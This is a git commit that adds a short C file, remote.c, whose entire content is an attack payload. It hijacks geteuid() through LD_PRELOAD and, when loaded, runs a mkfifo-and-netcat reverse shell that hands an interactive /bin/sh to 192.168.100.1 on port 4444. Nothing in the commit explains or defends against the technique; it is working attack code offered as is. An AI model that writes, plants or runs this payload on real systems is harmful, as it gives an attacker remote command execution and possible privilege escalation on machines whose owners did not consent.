6dddcbc9b3f97b3e1261b127c238b9a694c6fe97
Anggrdwjy <anggarda.wijaya410@gmail.com>
2025-01-11 20:50:35 +0700

    Create remote.c

---
+++ asset/remote.c
@@ -0,0 +1,11 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+void payload() {
+system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.1 4444 >/tmp/f");
+}
+int geteuid() {
+if (getenv("LD_PRELOAD") == NULL) { return 0; }
+unsetenv("LD_PRELOAD");
+payload();
+}
